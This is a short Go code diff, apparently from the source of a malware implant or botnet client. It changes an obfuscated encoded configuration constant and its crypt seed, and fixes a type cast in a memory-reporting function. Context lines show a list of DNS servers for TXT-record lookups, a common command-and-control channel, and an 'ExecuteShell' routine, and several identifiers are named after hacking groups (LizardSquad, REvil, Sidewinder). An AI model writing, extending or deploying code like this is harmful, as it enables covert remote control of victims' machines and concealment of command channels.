@@ -36,8 +36,8 @@ import (
 var debugMode = true
 
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "d3mVEFASkzds12Q/+twaQgBcQNODMUbks24bq/LbU4BUr" //change me run setup.py
-const cryptSeed = "7b32e8e1"                                        //change me run setup.py
+const gothTits = "d3mVErbVNRsfdt1Q/+twaQgBcQNODMUbks24bq/LbU4BUr" //change me run setup.py
+const cryptSeed = "7b32e8e1"                                      //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
 var lizardSquad = []string{
@@ -622,7 +622,7 @@ func revilMem() int64 {
 	if err := syscall.Sysinfo(&info); err != nil {
 		return 0
 	}
-	return int64(info.Totalram * uint64(info.Unit) / 1024 / 1024)
+	return int64(uint64(info.Totalram) * uint64(info.Unit) / 1024 / 1024)
 }
 
 // ExecuteShell => sidewinder
